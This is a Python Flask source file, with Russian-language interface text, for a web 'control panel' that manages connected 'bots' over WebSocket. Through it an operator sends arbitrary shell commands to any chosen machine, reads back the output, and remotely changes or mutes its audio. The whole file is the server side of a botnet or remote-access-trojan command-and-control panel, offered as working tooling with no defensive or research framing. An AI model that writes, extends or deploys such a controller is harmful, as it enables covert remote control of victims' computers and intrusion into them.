import time
import threading
from flask import Flask, render_template_string, request, jsonify
from flask_sock import Sock

app = Flask(__name__)
sock = Sock(app)

bots = {}
ws_map = {}
command_results = {}
volume_levels = {} # Специальный словарь для хранения громкости { 'ip': level }
events = {} # { 'ip': threading.Event() }

HTML_TEMPLATE = """
<!doctype html>
<html lang="ru"><head><meta charset="utf-8"><title>Панель управления</title>
<style>body{font-family:monospace;background-color:#1a1a1a;color:#0f0;} .container{width:80%;margin:auto;} h1,h2{text-align:center;} table{width:100%;border-collapse:collapse;margin-bottom:20px;} th,td{border:1px solid #0f0;padding:8px;text-align:left;} form, .control-block {margin-top:20px;padding:15px;border:1px solid #0f0;} select,input[type="text"]{width:100%;padding:10px;margin-bottom:10px;background-color:#333;color:#0f0;border:1px solid #0f0;} input[type="submit"], button{background-color:#0f0;color:#1a1a1a;padding:10px;border:none;cursor:pointer;margin-right:10px;} pre{background-color:#000;padding:15px;border:1px solid #0f0;white-space:pre-wrap;word-wrap:break-word;} input[type="range"]{width: 80%;} output{padding-left:10px;}<;/style>
</head><body onload="document.getElementById('bot_id_vol').dispatchEvent(new Event('change'))">
<div class="container"><h1>Панель управления v4</h1><h2>Активные боты: {{ bots|length }}</h2>
{% if bots %}
    <form method="post" action="/command"><h3>Выполнение команд</h3><label for="bot_id_cmd">Выберите бота:</label><select name="bot_id" id="bot_id_cmd">
    {% for bot_id in bots.keys() %}<option value="{{ bot_id }}">{{ bot_id }}</option>{% endfor %}</select><label for="command">Введите команду:</label><input type="text" name="command" id="command" required><input type="submit" value="Отправить команду"></form>

    <div class="control-block"><h3>Управление звуком (Real-time)</h3><label for="bot_id_vol">Выберите бота:</label>
    <select id="bot_id_vol" onchange="getCurrentVolume()"> {% for bot_id in bots.keys() %}<option value="{{ bot_id }}">{{ bot_id }}</option>{% endfor %}</select>
    <label for="volume_slider">Громкость:</label><br><input type="range" id="volume_slider" min="0" max="100" value="50" oninput="sendVolumeCommand('setvolume ' + this.value)"><output id="volume_output">50%</output><br><br>
    <button onclick="sendVolumeCommand('mute')">Выключить звук (Mute)</button><button onclick="sendVolumeCommand('unmute')">Включить звук</button></div>
{% else %}<p>Нет активных ботов.</p>{% endif %}
{% if command_sent and result %}<h2>Результат для бота {{ target_bot }}:</h2><pre><b>Команда:</b> {{ command_sent }}<br><b>Ответ:</b><br>{{ result }}</pre>{% endif %}
</div>
<script>
    const volumeSlider = document.getElementById('volume_slider');
    const volumeOutput = document.getElementById('volume_output');
    volumeSlider.addEventListener('input', () => { volumeOutput.value = volumeSlider.value + '%'; });

    async function sendVolumeCommand(command) {
        const botId = document.getElementById('bot_id_vol').value;
        if (!botId) return;
        fetch('/api/control', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ bot_id: botId, command: command }) });
    }

    async function getCurrentVolume() {
        const botId = document.getElementById('bot_id_vol').value;
        if (!botId) return;
        try {
            const response = await fetch('/api/get_volume', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ bot_id: botId })
            });
            const data = await response.json();
            if (data.status === 'ok') {
                volumeSlider.value = data.volume;
                volumeOutput.value = data.volume + '%';
            }
        } catch (error) { console.error('Error getting volume:', error); }
    }
</script>
</body></html>"""

@app.route('/')
def index(): return render_template_string(HTML_TEMPLATE, bots=bots)

@app.route('/command', methods=['POST'])
def command():
    bot_id = request.form.get('bot_id')
    cmd = request.form.get('command')
    result_text = "Ошибка: бот не найден или отвалился."
    if bot_id in bots:
        try:
            ws = bots[bot_id]
            ws.send(cmd)
            time.sleep(2)
            result_text = command_results.get(bot_id, "Бот не ответил.")
        except Exception as e:
            result_text = f"Ошибка при отправке команды: {e}"
            if bot_id in bots: del bots[bot_id]
    return render_template_string(HTML_TEMPLATE, bots=bots, result=result_text, command_sent=cmd, target_bot=bot_id)

@app.route('/api/control', methods=['POST'])
def api_control():
    data = request.get_json()
    bot_id = data.get('bot_id')
    cmd = data.get('command')
    if bot_id and cmd and bot_id in bots:
        try:
            bots[bot_id].send(cmd)
            return jsonify({'status': 'ok'})
        except Exception as e: return jsonify({'status': 'error', 'message': str(e)}), 500
    return jsonify({'status': 'error', 'message': 'Invalid request'}), 400

@app.route('/api/get_volume', methods=['POST'])
def api_get_volume():
    bot_id = request.json.get('bot_id')
    if bot_id in bots:
        try:
            # Создаем событие, которое будет ждать ответа от бота
            events[bot_id] = threading.Event()
            bots[bot_id].send('getvolume')

            # Ждем до 3 секунд, пока бот ответит и установит событие
            if events[bot_id].wait(timeout=3):
                level = volume_levels.get(bot_id, 50)
                return jsonify({'status': 'ok', 'volume': level})
            else:
                return jsonify({'status': 'timeout'}), 408 # Request Timeout
        except Exception as e:
            return jsonify({'status': 'error', 'message': str(e)}), 500
    return jsonify({'status': 'not_found'}), 404

@sock.route('/ws')
def websocket_handler(ws):
    bot_ip = ws.environ.get('HTTP_X_FORWARDED_FOR', ws.environ.get('REMOTE_ADDR', 'unknown_ip'))
    bots[bot_ip] = ws
    ws_map[ws] = bot_ip
    print(f"[+] Новый бот подключился: {bot_ip}")
    try:
        while True:
            result = ws.receive()
            current_bot_ip = ws_map.get(ws)
            if not current_bot_ip: continue

            # --- ИЗМЕНЕННАЯ ЛОГИКА ОБРАБОТКИ ОТВЕТОВ ---
            if result.startswith('VOL_LEVEL:'):
                level_str = result.split(':')[1]
                if level_str.isdigit():
                    volume_levels[current_bot_ip] = int(level_str)
                    if current_bot_ip in events:
                        events[current_bot_ip].set() # Сигнализируем, что ответ получен
            else:
                command_results[current_bot_ip] = result
    except Exception:
        dead_bot_ip = ws_map.get(ws)
        if dead_bot_ip:
            for d in [bots, ws_map, volume_levels, command_results, events]:
                if dead_bot_ip in d: del d[dead_bot_ip]
        print(f"[-] Бот {dead_bot_ip} отвалился.")

if __name__ == '__main__':
    print("Этот скрипт предназначен для запуска через Gunicorn.")
